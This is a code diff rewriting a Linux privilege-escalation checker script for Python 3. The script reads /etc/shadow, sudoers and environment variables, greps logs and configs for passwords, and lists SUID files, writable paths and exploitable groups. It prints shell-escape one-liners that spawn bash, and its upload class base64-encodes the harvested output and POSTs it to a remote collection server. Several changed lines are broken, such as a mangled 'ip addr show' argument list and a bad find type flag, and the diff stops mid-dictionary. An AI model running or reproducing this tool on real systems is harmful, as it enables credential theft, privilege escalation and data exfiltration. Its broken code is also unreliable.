@@ -1,316 +1,390 @@
-from __future__ import print_function, unicode_literals
-from collections import OrderedDict
-from io import open     # Avoid unicode nightmares
+#!/usr/bin/env python3
 import argparse
 import sys
 import subprocess as sub
-try:
-    # Python 2 imports
-    from urllib2 import Request, urlopen
-    from urllib import urlencode
-except ImportError:
-    # Python 3 imports
-    from urllib.request import Request, urlopen
-    from urllib.parse import urlencode
-
-__version__ = '3'
+from shutil import which
+from urllib.request import Request, urlopen
+from urllib.parse import urlencode
+from urllib.error import URLError
+from base64 import b64encode
 
 
 class HTTPUpload(object):
     """Send our collected data back."""
     def __init__(self, host, port):
         self.url = 'http://{}:{}'.format(host, port)
+        self.error = False
 
     def write(self, msg):
-        post = {'data': msg}
+        post = {'data': b64encode(msg)}
         try:
-            r = Request(self.url, urlencode(post).encode("utf-8"))
+            r = Request(self.url, urlencode(post).encode())
             urlopen(r)
-        except UnicodeEncodeError:
-            # This exception gets raised when UTF-16 is part of the input
-            pass
+        except URLError:
+            # Display the error message only once
+            # and don't exit the program
+            if self.error is False:
+                sys.stderr.write("Couldn't connect back to linuxprivserver.py")
+                self.error = True
 
 
-bigline = "==================================================================================================="
-smlline = "---------------------------------------------------------------------------------------------------"
-
-BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)
+bigline = b'=' * 80
+smlline = b'-' * 80
 
 
 def printColour(text, streams, colour=None):
-    try:
-        if colour != -1 and colour is not None:
-            text = "\x1b[1;{}m{}\x1b[0m".format(30 + colour, text)
-        for s in streams:
-            s.write(text)
-    except UnicodeEncodeError:
-        # This exception gets raised when UTF-16 is part of the input
-        pass
+    """
+    Writes the output to the various binary output streams.
+    Optionally colorizes the output
+
+    :param text: The text to write to the output streams. If the type is a
+                 string, it will be converted to a binary string.
+    :type bytes:
+    :param streams: A list of output streams (preferentially binary streams)
+    :type list:
+    :param colour: None, or a bytestring with a bash colour code highlighting
+                   text
+    :type None_or_bytes:
+    :rtype None:
+    """
+    if type(text) == str:
+        text = text.encode()
+    if colour is not None:
+        text = b'\x1b[1;' + colour + b'm' + text + b'\x1b[0m'
+    for s in streams:
+        s.write(text)
 
 
-# loop through dictionary, execute the commands, store the results, return updated dict
-def execCmd(cmdDict):
+def printFormatResult(cmdDict, streams, color=None):
+    """
+    Parse the dictionary 'cmdDict' and send the results to printColour.
+
+    :param cmdDict: A dictionary containing a list of dictionaries. Each
+                    sub-dictionary contains a 'msg' with a description and
+                    a 'results' containing the output executed commands or
+                    reading files.
+    :type dict:
+    :param streams: A list of output streams (preferentially binary streams)
+    :type list:
+    :rtype None:
+    """
     for item in cmdDict:
-        cmd = cmdDict[item]["cmd"]
-        out, error = sub.Popen([cmd], stdout=sub.PIPE, stderr=sub.PIPE, shell=True).communicate()
-        results = out.decode('utf-8').splitlines()
-        cmdDict[item]["results"] = results
+        if 'results' not in cmdDict[item]:
+            continue
+        msg = cmdDict[item]['msg'].encode()
+        results = cmdDict[item]['results']
+        if type(results) == str:
+            results = results.encode()
+        printColour(b'\n[+] ' + msg, streams, color)
+        printColour(b'\n' + results, streams)
+        printColour(b'', streams, color)
+
+
+def execCmd(cmdDict):
+    """
+    Execute the commands in cmdDict. Note that the cmdDict will be updated to
+    include the results of the executed commands/read files.
+
+    :param cmdDict: cmdDict is dictionary that contains a list of dictionaries.
+                    Each sub-dictionary should contain either of the following
+                    entries:
+                    - 'cmd': the command to execute, it can be specified as a
+                      list, or as a string. In the latter case, the 'cmd' will
+                      be executed in a shell.
+                    - 'altcmd': when 'cmd' does not exist in $PATH, it will try
+                      to execute 'altcmd' instead. For syntax, see 'cmd'.
+                    - 'file': can be specified instead of 'cmd' to read files
+    :type dict:
+    :rtype dict:
+    """
+    for item in cmdDict:
+        if 'cmd' in cmdDict[item]:
+            cmd = cmdDict[item]['cmd']
+            # Check if the binary exists in $PATH
+            if which(cmd[0]) is None:
+                if 'altcmd' in cmdDict[item] and \
+                        which(cmdDict[item]['altcmd']) is not None:
+                    cmdDict[item]['cmd'] = cmdDict[item]['altcmd']
+                else:
+                    continue
+            try:
+                # Spawn shell only if cmd is supplied as a str instead of list
+                # Load on target is reduced when spawning a shell is avoided
+                shell = type(cmd) == str
+                proc = sub.Popen(cmd,
+                                 stdout=sub.PIPE,
+                                 stderr=sub.DEVNULL,
+                                 shell=shell)
+            except PermissionError:
+                continue
+            out = proc.stdout.read()
+        elif 'file' in cmdDict[item]:
+            filename = cmdDict[item]['file']
+            try:
+                with open(filename, 'rb') as f:
+                    out = f.read()
+            except (FileNotFoundError, PermissionError):
+                continue
+        cmdDict[item]['results'] = out
     return cmdDict
 
 
-# print results for each previously executed command, no return value
-def printFormatResult(cmdDict, streams, color=None):
-    c = YELLOW if color is True else None
-    for item in cmdDict:
-        msg = cmdDict[item]["msg"]
-        results = cmdDict[item]["results"]
-        printColour("\n\n[+] " + msg, streams, c)
-        for result in results:
-            if result.strip() != "":
-                printColour("\n    {:}".format(result), streams)
-        printColour("", streams, color)
-    return
-
-
 def getSystemInfo():
-    sysInfo = OrderedDict()
-    sysInfo["OS"] = {"cmd": "cat /etc/issue",
-                     "msg": "Operating System"} 
-    sysInfo["KERNEL"] = {"cmd": "cat /proc/version",
-                         "msg": "Kernel"}
-    sysInfo["HOSTNAME"] = {"cmd": "hostname",
-                           "msg": "Hostname"}
+    info = {}
+    info['OS'] = {'file': '/etc/issue',
+                  'msg': 'Operating System'}
+    info['KERNEL'] = {'file': '/proc/version',
+                      'msg': 'Kernel'}
+    info['HOSTNAME'] = {'file': '/etc/hostname',
+                        'msg': 'Hostname'}
 
-    return execCmd(sysInfo)
+    return execCmd(info)
 
 
 def getNetworkInfo():
-    netInfo = OrderedDict()
-    netInfo["NETINFO"] = {"cmd": "if command -v ip 1>/dev/null; then ip addr show; else ifconfig; fi",
-                          "msg": "Interfaces"}
-    netInfo["ROUTE"] = {"cmd": "route",
-                        "msg": "Route"}
-    netInfo["NETSTAT"] = {"cmd": "netstat -antup | grep -v 'TIME_WAIT'",
-                          "msg": "Netstat"}
-    netInfo["ARP"] = {"cmd": "arp -a",
-                      "msg": "Arp cache"}
+    info = {}
+    info['NETINFO'] = {'cmd': ['ip', 'addr' 'show'],
+                       'altcmd': ['ifconfig'],
+                       'msg': 'Interfaces'}
+    info['ROUTE'] = {'cmd': ['ip', 'route'],
+                     'altcmd': ['route'],
+                     'msg': 'Routing table'}
+    info['NETSTAT'] = {'cmd': ['ss', '-tupan'],
+                       'altcmd': ['netstat', '-tupan'],
+                       'msg': 'TCP and UDP open ports and connections'}
+    info['ARP'] = {'cmd': ['ip', 'neigh'],
+                   'altcmd': ['arp', '-a'],
+                   'msg': 'Arp cache'}
 
-    return execCmd(netInfo)
+    return execCmd(info)
 
 
 def getFileSystemInfo():
-    driveInfo = OrderedDict()
-    driveInfo["MOUNT"] = {"cmd": "mount",
-                          "msg": "Mount results"}
-    driveInfo["FSTAB"] = {"cmd": "cat /etc/fstab 2>/dev/null",
-                          "msg": "fstab entries"}
+    info = {}
+    info['MOUNT'] = {'file': '/etc/mtab',
+                     'msg': 'Currently mounted filesystems'}
+    info['FSTAB'] = {'cmd': '/etc/fstab',
+                     'msg': 'fstab entries (mounted at boot)'}
 
-    return execCmd(driveInfo)
+    return execCmd(info)
 
 
 def getCronJobs():
-    cronInfo = OrderedDict()
-    cronInfo["CRON"] = {"cmd": "ls -la /etc/cron* 2>/dev/null",
-                        "msg":"Scheduled cron jobs"}
-    cronInfo["CRONW"] =  {"cmd": "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null",
-                          "msg":"Writable cron dirs"}
+    info = {}
+    info['CRON'] = {'cmd': 'ls -la /etc/cron*',
+                    'msg': 'Scheduled cron jobs'}
+    info['CRONW'] = {'cmd': 'ls -Rl /etc/cron* 2>/dev/null | awk "$1 ~ /w.$/"',
+                     'msg': 'Writable cron dirs'}
 
-    return execCmd(cronInfo)
+    return execCmd(info)
 
 
 def getSystemdInfo():
-    systemdInfo = OrderedDict()
-    systemdInfo["systemctl timers"] = {"cmd": "systemctl list-timers",
-                                       "msg": "systemd scheduled tasks"}
-    systemdInfo["journalctl"] = {"cmd": "journalctl -n 100",
-                                 "msg": "Last 100 lines in journalctl (privileged to adm)"}
+    info = {}
+    info['systemd-timers'] = {'cmd': ['systemctl', 'list-timers'],
+                              'msg': 'systemd scheduled tasks'}
+    info['journalctl'] = {'cmd': ['journalctl', '-n', '100'],
+                          'msg': 'Last 100 lines in journalctl (adm group)'}
 
-    return execCmd(systemdInfo)
+    return execCmd(info)
 
 
-def getUserInfo():
-    userInfo = OrderedDict()
-    userInfo["WHOAMI"] = {"cmd": "whoami",
-                           "msg":"Current User"}
-    userInfo["ID"] = {"cmd": "id",
-                      "msg": "Current User ID"}
-    userInfo["ALLUSERS"] = {"cmd": "cat /etc/passwd",
-                            "msg": "All users"}
-    userInfo["ALLGROUPS"] = {"cmd": "cat /etc/group",
-                             "msg": "All groups"}
-    userInfo["SUPUSERS"] = {"cmd": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
-                            "msg":"Super Users Found:"}
-    userInfo["HISTORY"] = {"cmd": "ls -la ~/.*hist*; ls -la /root/.*hist* 2>/dev/null",
-                           "msg": "Root and current user history (depends on privs)"}
-    userInfo["ENV"] = {"cmd": "env 2>/dev/null | grep -v 'LS_COLORS'",
-                       "msg": "Environment"}
-    userInfo["SUDOERS"] = {"cmd": "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null",
-                           "msg": "Sudoers (privileged)"}
-    userInfo["SUDOCMD"] = {"cmd": "sudo -n -l 2>/dev/null",
-                           "msg": "Allowed sudo commands"}
-    userInfo["LOGGEDIN"] = {"cmd": "w 2>/dev/null",
-                            "msg": "Logged in User Activity"}
-    userInfo["FILESOUTSIDEHOME"] = {"cmd": "find / -path $( getent passwd \"$USER\" | cut -d: -f6 ) -prune -o -path /proc -prune -o -user \"$USER\" -ls 2>/dev/null",
-                                    "msg": "Files owned by current user outside the home-folder"}
+def getUserInfo(deep=False):
+    info = {}
+    info['WHOAMI'] = {'cmd': ['whoami'],
+                      'msg': 'Current User'}
+    info['ID'] = {'cmd': ['id'],
+                  'msg': 'Current User ID'}
+    info['ALLUSERS'] = {'cmd': ['getent', 'passwd'],
+                        'msg': 'All users'}
+    info['ALLGROUPS'] = {'cmd': ['getent', 'group'],
+                         'msg': 'All groups'}
+    info['HISTORY'] = {'cmd': 'ls -la ~/.*hist*; ls -la /root/.*hist*',
+                       'msg': 'Root and current user history (depends on privs)'}
+    info['ENV'] = {'file': '/proc/self/environ',
+                   'msg': 'Environment variables'}
+    info['SUDOERS'] = {'file': '/etc/sudoers',
+                       'msg': 'Sudoers (privileged)'}
+    info['SUDOCMD'] = {'cmd': ['sudo', '-nl'],
+                       'msg': 'Allowed sudo commands'}
+    info['LOGGEDIN'] = {'cmd': ['w'],
+                        'msg': 'Logged in User Activity'}
 
-    return execCmd(userInfo)
+    return execCmd(info)
 
 
 def interestingGroups(groups):
-    groupInfo = OrderedDict()
-    if 'sudo' in groups:
-        groupInfo['sudo'] = {"msg": "User belongs to the group: sudo",
-                             "results": ["Can be used for privilege escalation."]}
-    if 'adm' in groups:
-        groupInfo['adm'] = {"msg": "User belongs to group: adm",
-                            "results": ["Can view numerous log files/journalctl and perhaps perform some administrative tasks. Might I suggest to run:\nfind / -group adm -ls 2>/dev/null"]}
-    if 'docker' in groups:
-        groupInfo["docker"] = {"msg": "User belongs to group: docker",
-                               "results": ["Might be used for privilege escalation. Consider e.g. https://fosterelli.co/privilege-escalation-via-docker.html"]}
-    if 'lxd' in groups:
-        groupInfo["lxd"] = {"msg": "User belongs to group: lxd",
-                            "results": ["Consider e.g. https://reboare.github.io/lxd/lxd-escape.html"]}
+    info = {}
+    if b'sudo' in groups:
+        info['sudo'] = {'msg': 'User belongs to the group: sudo',
+                        'results': 'Can be used for privilege escalation.'}
+    if b'adm' in groups:
+        info['adm'] = {'msg': 'User belongs to group: adm',
+                       'results': 'Can view numerous log files/journalctl and perform some administrative tasks'}
+    if b'docker' in groups:
+        info['docker'] = {'msg': 'User belongs to group: docker',
+                          'results': b'Might be used for privilege escalation. Consider e.g. https://fosterelli.co/privilege-escalation-via-docker.html'}
+    if b'lxd' in groups:
+        info['lxd'] = {'msg': 'User belongs to group: lxd',
+                       'results': b'Consider e.g. https://reboare.github.io/lxd/lxd-escape.html'}
+    if b'disk' in groups:
+        info['disk'] = {'msg': 'User belongs to group: disk',
+                        'results': b'Full permission to alter the filesystem, for example through debugfs'}
 
-    return groupInfo
+    return info
 
 
-def getFileDirInfo():
-    fdPerms = OrderedDict()
-    fdPerms["WWDIRSROOT"] = {"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -ls 2>/dev/null | grep root",
-                             "msg":"World Writeable Directories for User/Group 'Root'"}
-    fdPerms["WWDIRS"] = {"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -ls 2>/dev/null | grep -v root", 
-                         "msg":"World Writeable Directories for Users other than Root"}
-    fdPerms["WWFILES"] = {"cmd": "find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -ls 2>/dev/null",
-                          "msg" :"World Writable Files"}
-    fdPerms["SUID"] = {"cmd": "find / \( -perm -2000 -o -perm -4000 \) -ls 2>/dev/null",
-                       "msg":"SUID/SGID Files and Directories"}
-    fdPerms["USERHOME"] = {"cmd": "ls -ahl /home",
-                           "msg": "Checking permissions on the home folders."}
-    fdPerms["ROOTHOME"] = {"cmd": "ls -ahl /root 2>/dev/null",
-                           "msg": "Checking if root's home folder is accessible"}
+def getFileDirInfo(home, runFind=True):
+    info = {}
+    info['USERHOME'] = {'cmd': ['ls', '-ahl', '/home'],
+                        'msg': 'Checking permissions on the home folders.'}
+    info['ROOTHOME'] = {'cmd': ['ls', '-ahl', '/root'],
+                        'msg': 'Checking if root\'s folder is accessible'}
+    if not runFind:
+        return execCmd(info)
+    info['WWDIRSROOT'] = \
+        {'cmd': ['find', '/', '-writable', '-type', '-d', '(', '-user', 'root',
+                 '-o', '-group', 'root', ')', '-ls'],
+         'msg': 'World-writable directories for User/Group root'}
+    info['WWDIRS'] = \
+        {'cmd': ['find', '/', '-path', home, '-prune', '-o', '-path', '/proc',
+                 '-prune', '-o', '-writable', '-type', 'd', '-ls'],
+         'msg': 'World-writeable directories for current user outside $HOME'}
+    info['WWFILES'] = \
+        {'cmd': ['find', '/', '-path', home, '-prune', '-o', '-path', '/proc',
+                 '-prune', '-o', '-writable', '-type', 'f', '-ls'],
+         'msg': 'World-writable files for current user outside $HOME'}
+    info['SUID'] = \
+        {'cmd': ['find', '/', '(', '-perm', '-2000', '-o', '-perm', '-4000',
+                 ')', '-ls'],
+         'msg': 'SUID/SGID Files and Directories'}
+    info['CAPS'] = {'cmd': ['getcap', '-r', '/'],
+                    'msg': 'Files with Linux capabilities'}
 
-    return execCmd(fdPerms)
+    return execCmd(info)
 
 
 def getPwFileInfo():
-    pwFiles = OrderedDict()
-    pwFiles["LOGPWDS"] = {"cmd": "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
-                           "msg": "Logs containing keyword 'password'"}
-    pwFiles["CONFPWDS"] = {"cmd": "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
-                            "msg": "Config files containing keyword 'password'"}
-    pwFiles["SHADOW"] = {"cmd": "cat /etc/shadow 2>/dev/null",
-                          "msg": "Shadow File (Privileged)"}
+    info = {}
+    info['LOGPWDS'] = \
+        {'cmd': ['egrep',  'pwd|password', '/var/log', '-r'],
+         'msg': 'Log files in /var/log containing password or pwd'}
+    info['CONFPWDS'] = \
+        {'cmd': ['egrep',  'pwd|password', '/etc', '--include', '*conf*',
+                 '-r'],
+         'msg': 'Configuration files in /etc containing password or pwd'}
+    info['SHADOW'] = {'file': '/etc/shadow',
+                      'msg': 'Shadow File (Privileged)'}
 
-    return execCmd(pwFiles)
+    return execCmd(info)
 
 
 def getMail():
-    mailFiles = OrderedDict({"MAIL": {"cmd": "ls -la /var/mail 2>/dev/null",
-                             "msg": "Any mail that can be read."}})
+    info = {'MAIL': {'cmd': ['ls', '-la', '/var/mail/'],
+                     'msg': 'Any mail that can be read.'}}
 
-    return execCmd(mailFiles)
+    return execCmd(info)
 
 
 def processesAppsInfo(sysInfo):
-    if "debian" in sysInfo["KERNEL"]["results"][0].lower() or "ubuntu" in sysInfo["KERNEL"]["results"][0].lower():
-        getPkgs = "dpkg -l | awk '{$1=$4=\"\"; print $0}'" # debian
-    elif "arch" in sysInfo["KERNEL"]["results"][0].lower():
-        getPkgs = "pacman -Qe"
-    else:
-        getPkgs = "rpm -qa | sort -u" # RH/other
+    # Debian/Ubuntu systems
+    if which('dpkg') is not None:
+        getPkgs = "dpkg -l | awk '{$1=$4=\"\"; print $0}'"
+    # Arch/Manjaro systems
+    elif which('pacman') is not None:
+        getPkgs = ['pacman', '-Qe']
+    # OpenSuse/Fedora/Red Hat systems
+    elif which('rpm') is not None:
+        getPkgs = 'rpm -qa | sort -u'
+    elif which('equery') is not None:
+        getPkgs = ['equery', 'list', '"*"']
+    # Alpine systems
+    elif which('apk') is not None:
+        getPkgs = 'apk info -vv | sort'
 
-    getAppProc = OrderedDict()
-    getAppProc["PROCS"] = {"cmd": "ps aux | awk '{print $1,$2,$9,$10,$11}'",
-                           "msg": "Current processes"}
-    getAppProc["PKGS"] = {"cmd": getPkgs,
-                          "msg": "Installed Packages"}
-    getAppProc["CONF"] = {"cmd": "find /etc -name '*.conf' -ls 2>/dev/null",
-                          "msg": "configuration files inside /etc"}
+    info = {}
+    info['PROCS'] = {'cmd': ['ps', 'aux'],
+                     'msg': "Current processes"}
+    info['PKGS'] = {'cmd': getPkgs,
+                    'msg': "Installed Packages"}
+    info['CONF'] = {'cmd': ['find', '/etc', '-name', '*.conf', '-ls'],
+                    'msg': 'Configuration files inside /etc'}
 
-    return execCmd(getAppProc)
+    return execCmd(info)
 
 
 def moreApps():
-    otherApps = OrderedDict()
-    otherApps["SUDO"] = {"cmd": "sudo -V | grep version 2>/dev/null",
-                          "msg":"Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)"}
-    otherApps["APACHE"] = {"cmd": "apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null",
-                           "msg":"Apache Version and Modules"}
-    otherApps["APACHECONF"] = {"cmd": "cat /etc/apache2/apache2.conf 2>/dev/null",
-                               "msg":"Apache Config File"}
+    info = {}
+    info['SUDO'] = {'cmd': 'sudo -V | grep version',
+                    'msg': 'Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)'}
+    info['APACHE'] = {'cmd': 'apache2 -v; apache2ctl -M; httpd -v; apachectl -l',
+                      'msg': 'Apache Version and Modules'}
+    info['APACHECONF'] = {'file': '/etc/apache2/apache2.conf',
+                          'msg': 'Apache Config File'}
+    info['NGINX'] = {'cmd': ['nginx', '-v'],
+                     'msg': 'Nginx version'}
+    info['NGINXCONF'] = {'file': '/etc/nginx/nginx.conf',
+                         'msg': 'Nginx version'}
 
-    return execCmd(otherApps)
-
-
-def rootProcesses(procs, pkgs, supusers):
-    procdict = OrderedDict() # dictionary to hold the processes running as super users
-    # find the package information for the processes currently running
-    # under root or another super user
-    for proc in procs: # loop through each process
-        relatedpkgs = [] # list to hold the packages related to a process
-        try:
-            for user in supusers: # loop through the known super users
-                if (user != "") and (user in proc): # if the process is being run by a super user
-                    procname = proc.split(" ")[4] # grab the process name
-                    if "/" in procname:
-                            splitname = procname.split("/")
-                            procname = splitname[len(splitname)-1]
-                    for pkg in pkgs: # loop through the packages
-                        if not len(procname) < 3: # name too short to get reliable package results
-                            if procname in pkg: 
-                                if procname in procdict: 
-                                    relatedpkgs = procdict[proc] # if already in the dict, grab its pkg list
-                                if pkg not in relatedpkgs:
-                                    relatedpkgs.append(pkg) # add pkg to the list
-                    procdict[proc]=relatedpkgs # add any found related packages to the process dictionary entry
-        except:
-            pass
-
-    result = ''
-    for key in procdict:
-        result += "\n    " + key # print the process name
-        try:
-            if not procdict[key][0] == "": # only print the rest if related packages were found
-                result += "        Possible Related Packages: "
-                for entry in procdict[key]:
-                    result += "            " + entry.decode('UTF-8') # print each related package
-        except:
-            pass
-
-    return result
+    return execCmd(info)
 
 
 def getContainerInfo():
-    containerInfo = OrderedDict()
-    containerInfo["DockerVersion"] = {"cmd": "docker --version 2>/dev/null",
-                                      "msg": "Is docker available"}
-    containerInfo["DockerInside"] = {"cmd": "cat /proc/self/cgroup | grep 'docker' && ls -l /.dockerenv 2>/dev/null",
-                                     "msg": "Are we inside a docker container?"}
-    containerInfo["LXCInside"] = {"cmd": "grep -qa container=lxc /proc/1/environ 2>/dev/null",
-                                  "msg": "Are we inside a lxc container (privileged)?"}
+    info = {}
+    info['DockerVersion'] = {'cmd': ['docker', '--version'],
+                             'msg': 'Is docker available'}
+    info['DockerInside'] = {'cmd': 'grep docker /proc/self/cgroup && ls -l /.dockerenv',
+                            'msg': 'Are we inside a docker container?'}
+    info['LXCInside'] = {'cmd': ['grep', '-qa', 'container=lxc', '/proc/1/environ'],
+                         'msg': 'Are we inside a lxc container (privileged)?'}
 
-    return execCmd(containerInfo)
+    return execCmd(info)
 
 
 # EXPLOIT ENUMERATION
 def exploitEnum():
-    devTools = OrderedDict()
-    devTools["TOOLS"] = {"cmd": "which awk perl python python2 python3 ruby gcc go rustc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null | grep -v 'not found'",
-                         "msg": "Installed Tools"}
+    devTools = {}
+    tools = ['which', 'awk', 'perl', 'python', 'python2', 'python3', 'ruby',
+             'gcc', 'g++', 'go', 'rustc', 'cc', 'nmap', 'find', 'netcat', 'nc',
+             'wget', 'tftp', 'ftp']
+    toolsResult = b''
+    for t in tools:
+        w = which(t)
+        if w is not None:
+            toolsResult += w.encode() + b'\n'
+    devTools['TOOLS'] = {'results': toolsResult,
+                         'msg': 'Installed Tools'}
+    editors = ['vi', 'vim', 'nvim', 'nano', 'pico', 'emacs']
+    editorsResult = b''
+    for e in editors:
+        w = which(e)
+        if e is not None:
+            editorsResult += e.encode() + b'\n'
+    devTools['EDITORS'] = {'results': editorsResult,
+                           'msg': 'Installed editors'}
 
-    return execCmd(devTools)
+    return devTools
 
 
 def main(args):
+    if not args.color:
+        RED = None
+        GREEN = None
+        YELLOW = None
+    else:
+        RED = b'31'
+        GREEN = b'32'
+        YELLOW = b'33'
+
     if args.outputfile:
         try:
-            outfile = open(args.outputfile, 'w', encoding='UTF-8')
-        except IOError:
-            msg = 'Something went wrong when opening the file that will contain the results. Giving up!'
-            if parser.color and not args.quiet:
+            outfile = open(args.outputfile, 'wb')
+        except (IOError, PermissionError):
+            msg = 'Something went wrong opening the output file. Giving up!'
+            if args.color and not args.quiet:
                 printColour(msg, sys.stdout, RED)
             elif not args.quiet:
-                print(msg)
+                sys.stdout.write(msg)
             sys.exit(1)
     else:
         args.outputfile = False
@@ -320,86 +394,90 @@ def main(args):
         upload = HTTPUpload(ip, port)
 
     outputs = []
-    if not args.quiet: outputs.append(sys.stdout)
-    if args.outputfile: outputs.append(outfile)
-    if args.sendhttp: outputs.append(upload)
+    if not args.quiet:
+        outputs.append(sys.stdout.buffer)
+    if args.outputfile:
+        outputs.append(outfile)
+    if args.sendhttp:
+        outputs.append(upload)
 
     printColour(bigline, outputs, GREEN)
-    printColour("\n     The Linux privilege escalation checker\n", outputs, GREEN)
+    printColour('\n\tThe Linux privilege escalation checker\n', outputs, GREEN)
     printColour(bigline, outputs, GREEN)
-    printColour('\n', outputs, True)
 
     sysInfo = getSystemInfo()
-    printColour("\n\n\n[*] GETTING BASIC SYSTEM INFO...\n", outputs, RED)
-    printFormatResult(sysInfo, outputs, True)
+    printColour('\n\n[*] GETTING BASIC SYSTEM INFO...', outputs, RED)
+    printFormatResult(sysInfo, outputs, YELLOW)
 
     userInfo = getUserInfo()
-    groupInfo = interestingGroups(userInfo["ID"]["results"][0])
-    printColour("\n\n\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n", outputs, RED)
-    printFormatResult(userInfo, outputs, True)
-    printFormatResult(groupInfo, outputs, True)
+    userInfo['ENV']['results'] = userInfo['ENV']['results'].replace(b'\x00', b'\n')
+    # Add the user's home folder
+    for line in userInfo['ALLUSERS']['results'].splitlines():
+        if line.startswith(userInfo['WHOAMI']['results'].strip()):
+            userInfo['HOMEFOLDER'] = {'results': line.split(b':')[5],
+                                      'msg': "Location of user's home folder"}
+    groupInfo = interestingGroups(userInfo["ID"]["results"])
+    printColour('\n\n[*] GETTING USER AND ENVIRONMENTAL INFO...', outputs, RED)
+    printFormatResult(userInfo, outputs, YELLOW)
+    printFormatResult(groupInfo, outputs, YELLOW)
 
     netInfo = getNetworkInfo()
-    printColour("\n\n\n[*] GETTING NETWORKING INFO...\n", outputs, RED)
-    printFormatResult(netInfo, outputs, True)
+    printColour('\n\n[*] GETTING NETWORKING INFO...', outputs, RED)
+    printFormatResult(netInfo, outputs, YELLOW)
 
     fsInfo = getFileSystemInfo()
-    printColour("\n\n\n[*] GETTING FILESYSTEM INFO...\n", outputs, RED)
-    printFormatResult(fsInfo, outputs, True)
+    printColour('\n\n[*] GETTING FILESYSTEM INFO...', outputs, RED)
+    printFormatResult(fsInfo, outputs, YELLOW)
 
     cronInfo = getCronJobs()
-    printColour("\n\n\n[*] GETTING INFO ON CRON JOBS...\n", outputs, RED)
-    printFormatResult(cronInfo, outputs, True)
+    printColour('\n\n[*] GETTING INFO ON CRON JOBS...', outputs, RED)
+    printFormatResult(cronInfo, outputs, YELLOW)
 
     systemdInfo = getSystemdInfo()
-    printColour("\n\n\n[*] GETTING systemd/journalctl INFO...\n", outputs, RED)
-    printFormatResult(systemdInfo, outputs, True)
+    printColour('\n\n[*] GETTING systemd/journalctl INFO...', outputs, RED)
+    printFormatResult(systemdInfo, outputs, YELLOW)
 
-    fileDirInfo = getFileDirInfo()
-    printColour("\n\n\n[*] GETTING FILESYSTEM INFO...\n", outputs, RED)
-    printFormatResult(fileDirInfo, outputs, True)
+    fileDirInfo = getFileDirInfo(userInfo['HOMEFOLDER']['results'], args.deep)
+    printColour('\n\n[*] GETTING FILESYSTEM INFO...', outputs, RED)
+    printFormatResult(fileDirInfo, outputs, YELLOW)
 
     pwFileInfo = getPwFileInfo()
-    printColour("\n\n\n[*] GETTING FILESYSTEM INFO...\n", outputs, RED)
-    printFormatResult(pwFileInfo, outputs, True)
+    printColour('\n\n[*] GETTING PASSWORD INFO...', outputs, RED)
+    printFormatResult(pwFileInfo, outputs, YELLOW)
 
     mailInfo = getMail()
-    printColour("\n\n\n[*] GETTING MAIL INFO...\n", outputs, RED)
-    printFormatResult(mailInfo, outputs, True)
+    printColour('\n\n[*] GETTING MAIL INFO...', outputs, RED)
+    printFormatResult(mailInfo, outputs, YELLOW)
 
     psInfo = processesAppsInfo(sysInfo)
-    printColour("\n\n\n[*] GETTING INFO ON PROCESSES AND APPS...\n", outputs, RED)
-    printFormatResult(psInfo, outputs, True)
+    printColour('\n\n[*] GETTING INFO ON PROCESSES AND APPS...', outputs, RED)
+    printFormatResult(psInfo, outputs, YELLOW)
 
     apps = moreApps()
-    printColour("\n\n\n[*] GETTING MORE INFO ON APPS...\n", outputs, RED)
-    printFormatResult(mailInfo, outputs, True)
-
-    #  rootPsInfo = rootProcesses(psInfo["PROCS"]["results"], psInfo["PKGS"]["results"], userInfo["SUPUSERS"]["results"])
-    #  printColour("\n\n\n[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...\n", outputs, RED)
-    #  printColour(rootPsInfo, outputs)
+    printColour('\n\n[*] GETTING MORE INFO ON APPS...', outputs, RED)
+    printFormatResult(apps, outputs, YELLOW)
 
     containerInfo = getContainerInfo()
-    printColour("\n\n\n[*] GETTING LXC/DOCKER INFO...\n", outputs, RED)
-    printFormatResult(containerInfo, outputs, True)
+    printColour('\n\n[*] GETTING LXC/DOCKER INFO...\n', outputs, RED)
+    printFormatResult(containerInfo, outputs, YELLOW)
 
     exploitTools = exploitEnum()
-    printColour("\n\n\n[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...\n", outputs, RED)
-    printFormatResult(exploitTools, outputs, True)
+    printColour('\n\n[*] ENUMERATING LANGUAGES/TOOLS...\n', outputs, RED)
+    printFormatResult(exploitTools, outputs, YELLOW)
 
-    printColour("\n\n\n[+] Related Shell Escape Sequences...\n", outputs, YELLOW)
-    escapeCmd = {"vi": [":!bash", ":set shell=/bin/bash:shell"],
-                 "awk": ["awk 'BEGIN {system(\"/bin/bash\")}'"],
-                 "perl": ["perl -e 'exec \"/bin/bash\";'"],
-                 "python2": ["python2 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
-                 "python3": ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
-                 "find": ["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"],
-                 "nmap":["--interactive"]}
+    printColour('\n\n[+] Related Shell Escape Sequences...\n', outputs, YELLOW)
+    escapeCmd = \
+        {b'vi': [b':!bash', b':set shell=/bin/bash:shell'],
+         b'awk': [b"awk 'BEGIN {system(\"/bin/bash\")}'"],
+         b'perl': [b"perl -e 'exec \"/bin/bash\";'"],
+         b'python2': [b"python2 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
